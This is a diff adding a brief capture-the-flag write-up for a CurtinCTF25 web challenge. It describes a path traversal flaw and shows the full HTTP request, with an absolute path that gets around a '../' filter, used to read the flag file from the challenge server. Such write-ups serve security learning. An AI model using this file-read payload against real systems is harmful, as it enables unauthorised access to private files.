@@ -1,0 +1,50 @@
+---
+title: 'CurtinCTF25 (Web) - Adventures of Harald Pt3'
+publishedAt: '2025-12-06'
+summary: ''
+category: 'ctf'
+competition: 'curtinctf25'
+---
+## 1. Challenge Information
+
+- Category: Web - Path traversal
+- Difficulty: Easy
+
+## 2. TL;DR Solution Summary
+
+> The book retrieval function is vulnerable to path traversal attack to retrive flag.txt at the root folder
+> 
+
+## 3. Vulnerability Breakdown
+
+- Path traversal can be exploited by using combinations of ../ to retrieve sensitive file
+
+## 4. Exploitation
+
+### 4.1 Method / Tools Used
+
+- Burpsuite
+
+### 4.2 Walkthrough
+
+- Since `../` is filtered out, include the base folder `/var/www/html/flag.txt`
+    
+    ```
+    GET /library/?book=/var/www/html/flag.txt HTTP/1.1
+    Host: curtinctfmy-adventures-of-harald3.chals.io
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: none
+    Sec-Fetch-User: ?1
+    X-Pwnfox-Color: green
+    Priority: u=0, i
+    Te: trailers
+    Connection: keep-alive
+    
+    ```
+    ![Screenshot 2025-12-06 at 23.02.47.png](/image/writing/competition/curtinctf25-web-adventures-of-harald-p3/1.png)
